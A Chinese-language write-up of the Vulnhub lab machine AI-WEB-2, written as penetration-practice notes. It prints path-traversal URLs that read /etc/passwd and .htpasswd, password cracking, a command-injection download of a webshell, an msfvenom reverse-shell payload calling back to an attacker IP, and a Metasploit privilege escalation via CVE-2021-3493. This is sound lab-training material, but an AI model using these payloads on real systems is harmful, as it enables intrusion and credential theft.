---
title: Vulnhub靶场笔记-AI-WEB2
date: 2023-11-08 18:53:00 +0800
img_path: /
categories: [肾透, Vulnhub靶场]
tags: [肾透, Vulnhub靶场]     # TAG names should always be lowercase
---

# AI-WEB-2

## 一、环境配置

更改网络适配器为NAT模式

![image-20231108203932205](assets/image-20231108203932205.png)

## 二、主机探测

在物理机中查看VMnet8网卡

![image-20231108145349160](assets/image-20231108145349160.png)

使用`fscan`探测AI-WEB-2靶机ip地址为：192.168.157.134

![image-20231108204303667](assets/image-20231108204303667.png)

![image-20231108204437632](assets/image-20231108204437632.png)

## 三、WEB信息收集

```bash
dirsearch -u http://192.168.157.134/
```

![image-20231108204718190](assets/image-20231108204718190.png)

存在`/webadmin`目录，但是需要账号密码

## 四、任意文件读取

看到有个注册的按钮，那就先注册一个账户进去。

![image-20231108205146048](assets/image-20231108205146048.png)

![image-20231108205207683](assets/image-20231108205207683.png)

通过搜索关键字找到FileSharing的历史漏洞：https://www.exploit-db.com/exploits/40009

![image-20231108205501932](assets/image-20231108205501932.png)

http://192.168.157.134/download.php?file_name=../../../../../../../../../../../../../etc/passwd

![image-20231108205651243](assets/image-20231108205651243.png)

http://192.168.157.134/download.php?file_name=../../../../../../../../../../etc/apache2/.htpasswd

利用任意文件读取apache系统认证文件，里面保存着账号密码。

![image-20231108205808240](assets/image-20231108205808240.png)

可通过爆破得到目录：`/etc/apache2/.htpasswd`
 账号密码：`aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/`
 账号是aiweb2admin，密码被加密了，使用**john**解密一下。

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt passwd  
```

![image-20231108203226795](assets/image-20231108203226795.png)

## 五、命令注入漏洞

输入账号密码认证后，`/webadmin/`存在`robots.txt`

![image-20231108210219191](assets/image-20231108210219191.png)

在`/H05Tpin9555`中存在命令注入

![image-20231108210348456](assets/image-20231108210348456.png)

通过命令注入漏洞远程下载冰蝎马

kali中在木马所在目录启动http服务器

```sh
python3 -m http.server 8888
```

![image-20231108210725428](assets/image-20231108210725428.png)

远程下载冰蝎马

![image-20231108210636473](assets/image-20231108210636473.png)

冰蝎连接，因`webadmin`目录存在认证所以需要自定义请求头来通过认证

![image-20231108210816438](assets/image-20231108210816438.png)

![image-20231108210923647](assets/image-20231108210923647.png)

## 六、提权拿Flag

发现疑似`ssh`连接信息的文件

![image-20231108211202056](assets/image-20231108211202056.png)

```txt
User: n0nr00tuser
Cred: zxowieoi4sdsadpEClDws1sf
```

ssh连接

```sh
ssh n0nr00tuser@192.168.157.134
zxowieoi4sdsadpEClDws1sf
```

![image-20231108211533221](assets/image-20231108211533221.png)

上线`msf`

```sh
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.157.138 LPORT=4444 -f elf > shell.elf

use exploit/multi/handler
set LHOST 192.168.157.138
set payload linux/x64/meterpreter/reverse_tcp
run
```

利用冰蝎将`shell.elf`上传到`/var/www/html/webadmin/H05Tpin9555/`

![image-20231108211721502](assets/image-20231108211721502.png)

在给`shell.elf`赋权限时发现不允许，将`shell.elf`复制到可赋权的目录`/tmp`

```sh
cp shell.elf /tmp/
cd /tmp
chmod +x shell.elf
./shell.elf
```

![image-20231108212023600](assets/image-20231108212023600.png)

上线后按`CTRL+Z`选择`y`保存`session`

![image-20231108212307838](assets/image-20231108212307838.png)

提权`cve-2021-3493`

```shell
search cve-2021-3493
use 0
set SESSION 0
run
```

![image-20231108212448933](assets/image-20231108212448933.png)

![image-20231108212541516](assets/image-20231108212541516.png)
